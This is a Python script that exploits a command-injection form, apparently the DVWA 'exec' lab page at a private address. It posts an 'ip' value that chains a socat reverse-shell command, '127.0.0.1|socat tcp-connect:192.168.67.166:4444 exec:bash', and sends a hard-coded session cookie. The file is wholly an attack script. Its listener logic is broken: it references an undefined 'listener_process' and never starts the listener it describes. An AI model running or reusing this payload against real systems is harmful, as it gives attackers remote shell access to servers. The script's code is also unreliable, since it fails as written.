import subprocess
import requests
import time

# Function to send the POST request to the vulnerable endpoint with reverse shell payload
def send_reverse_shell_request():
    """Send the POST request with the reverse shell payload."""
    url = "http://192.168.67.166/vulnerabilities/exec/"
    headers = {
        "Host": "192.168.67.166",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Referer": "http://192.168.67.166/vulnerabilities/exec/",
        "Cookie": "PHPSESSID=nh0gokq1sg1j3vtlbba32hu906; security=low",
        "Upgrade-Insecure-Requests": "1"
    }

    # Payload for reverse shell
    payload = {
        "ip": "127.0.0.1|socat tcp-connect:192.168.67.166:4444 exec:bash",
        "Submit": "Submit"
    }

    try:
        print(f"[+] Sending POST request to {url} with reverse shell payload...")
        response = requests.post(url, headers=headers, data=payload)
        
        # Check if the response is successful (status code 200)
        if response.status_code == 200:
            print("[+] Payload sent successfully!")
        else:
            print(f"[-] Error sending payload: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

# Main function to automate both tasks: starting the listener and sending the request
def main():
    print("[+] Starting automation process...")

    # Wait for a moment before sending the request to ensure the listener is ready
    time.sleep(2)

    # Send the reverse shell POST request
    send_reverse_shell_request()

    # Keep the listener running for a while or handle user input to stop it
    print("[+] Listener is running. Press Ctrl+C to stop.")
    try:
        listener_process.communicate()
    except KeyboardInterrupt:
        print("[+] Listener stopped by user.")

if __name__ == "__main__":
    main()
